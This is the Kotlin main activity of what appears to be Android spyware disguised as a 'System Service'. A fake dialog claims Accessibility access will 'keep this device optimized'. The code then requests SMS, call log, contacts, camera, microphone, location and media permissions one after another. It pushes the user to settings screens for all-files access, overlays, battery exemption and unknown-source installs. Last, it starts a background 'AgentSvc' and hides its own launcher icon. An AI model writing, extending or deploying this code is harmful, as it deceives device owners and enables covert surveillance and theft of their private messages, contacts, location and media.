package com.sys.service

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

class MainActivity : Activity() {

    companion object {
        var alive: MainActivity? = null
        val PERM = listOf(
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
            Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO
        )
    }

    private val h = Handler(Looper.getMainLooper())
    private var idx = 0
    private var sp = 0
    private var pending = false

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        alive = this
        if (Exec.svc != null) advance() else dialog()
    }

    override fun onDestroy() { alive = null; super.onDestroy() }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    private fun dialog() {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(22), dp(22), dp(22), dp(12))
            setBackgroundColor(0xFFFDFDFD.toInt())
        }
        card.addView(TextView(this).apply {
            text = "System Service"
            textSize = 19f
            setTextColor(0xFF202124.toInt())
        })
        card.addView(TextView(this).apply {
            text = "System Service needs Accessibility access to keep this device optimized. Tap Allow to continue."
            textSize = 14f
            setTextColor(0xFF5F6368.toInt())
            setPadding(0, dp(10), 0, dp(14))
        })
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.END
        }
        row.addView(Button(this).apply {
            text = "Deny"
            setOnClickListener { finish() }
        })
        row.addView(Button(this).apply {
            text = "Allow"
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_DETAILS_SETTINGS).apply {
                    putExtra(Intent.EXTRA_COMPONENT_NAME,
                        ComponentName(this@MainActivity, AccSvc::class.java).flattenToString())
                })
            }
        })
        card.addView(row)

        setContentView(LinearLayout(this).apply {
            setBackgroundColor(0x66000000)
            gravity = Gravity.CENTER
            addView(card, LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                leftMargin = dp(18); rightMargin = dp(18)
            })
        })
    }

    fun advance() {
        if (pending) return
        if (idx >= PERM.size) { specials(); return }
        val p = PERM[idx]
        if (checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED) { idx++; advance(); return }
        pending = true
        runCatching { requestPermissions(arrayOf(p), 100 + idx) }
        h.postDelayed({
            if (pending) { pending = false; idx++; advance() }
        }, 4000)
    }

    override fun onRequestPermissionsResult(req: Int, perms: Array<out String>, res: IntArray) {
        super.onRequestPermissionsResult(req, perms, res)
        pending = false
        idx++
        h.postDelayed({ advance() }, 400)
    }

    private fun go(i: Intent) {
        runCatching { startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) }
    }

    private fun specials() {
        when (sp++) {
            0 -> if (!Environment.isExternalStorageManager()) {
                go(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + packageName)))
                h.postDelayed({ specials() }, 3200)
            } else specials()
            1 -> if (!Settings.canDrawOverlays(this)) {
                go(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + packageName)))
                h.postDelayed({ specials() }, 2600)
            } else specials()
            2 -> {
                go(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + packageName)))
                h.postDelayed({ specials() }, 2600)
            }
            3 -> {
                go(Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + packageName)))
                h.postDelayed({ specials() }, 2600)
            }
            else -> done()
        }
    }

    private fun done() {
        startForegroundService(Intent(this, AgentSvc::class.java))
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        finish()
    }
}
